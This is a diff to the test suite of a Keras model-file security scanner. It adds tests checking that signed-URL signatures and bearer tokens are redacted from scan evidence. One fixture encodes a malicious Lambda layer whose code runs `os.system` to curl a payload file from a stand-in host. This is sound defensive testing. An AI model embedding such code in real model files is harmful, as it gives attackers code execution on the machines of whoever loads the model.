@@ -827,6 +827,41 @@ class TestKerasZipScanner:
             for issue in result.issues
         )
 
+    def test_lambda_code_preview_redacts_secret_bearing_evidence(self, tmp_path: Path) -> None:
+        scanner = KerasZipScanner()
+        malicious_code = (
+            "__import__('os').system('curl "
+            "https://storage.example/payload.py?X-Amz-Signature=SIGNED123&ok=1 "
+            "Authorization: Bearer ZIPSECRET456')"
+        )
+        encoded_code = base64.b64encode(malicious_code.encode()).decode()
+        config = {
+            "class_name": "Functional",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Lambda",
+                        "name": "lambda_1",
+                        "config": {"function": [encoded_code, None, None], "function_type": "lambda"},
+                    },
+                ],
+            },
+        }
+        keras_path = create_configured_keras_zip(tmp_path, config, keras_version="3.0.0")
+
+        result = scanner.scan(str(keras_path))
+
+        serialized = result.to_json()
+        dangerous_lambda = [check for check in result.checks if check.name == "Dangerous Lambda Layer"]
+        assert len(dangerous_lambda) == 1
+        preview = dangerous_lambda[0].details["code_preview"]
+        assert "SIGNED123" not in serialized
+        assert "ZIPSECRET456" not in serialized
+        assert "curl" in preview
+        assert "ok=1" in preview
+        assert "X-Amz-Signature=<redacted>" in preview
+        assert "Authorization: Bearer <redacted>" in preview
+
     def test_scan_normalized_weights_member_checks_embedded_hdf5_external_references(self, tmp_path: Path) -> None:
         """Normalized ./model.weights.h5 members should still receive Keras-specific HDF5 checks."""
         scanner = KerasZipScanner()
@@ -1497,7 +1532,41 @@ __import__('pickle').loads(data)
         model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3")
         result = scanner.scan(str(model_path))
 
-        assert any(check.details.get("cve_id") == "CVE-2025-12058" for check in result.checks)
+        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-12058"]
+        assert len(cve_checks) == 1
+        assert cve_checks[0].details["vocabulary"] == "https://example.com/vocab.txt"
+
+    def test_stringlookup_vocabulary_evidence_redacts_signed_urls(self, tmp_path: Path) -> None:
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "StringLookup",
+                        "name": "string_lookup",
+                        "config": {
+                            "vocabulary": (
+                                "https://example.com/vocab.txt?X-Amz-Signature=SIGNED123&token=VOCABSECRET456&ok=1"
+                            )
+                        },
+                    },
+                ],
+            },
+        }
+
+        model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3")
+        result = scanner.scan(str(model_path))
+
+        serialized = result.to_json()
+        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-12058"]
+        assert len(cve_checks) == 1
+        vocabulary = cve_checks[0].details["vocabulary"]
+        assert "SIGNED123" not in serialized
+        assert "VOCABSECRET456" not in serialized
+        assert "ok=1" in vocabulary
+        assert "X-Amz-Signature=<redacted>" in vocabulary
+        assert "token=<redacted>" in vocabulary
 
     def test_stringlookup_inline_vocabulary_list_stays_clean(self, tmp_path: Path) -> None:
         """Inline StringLookup vocabularies are benign and should not emit warnings."""
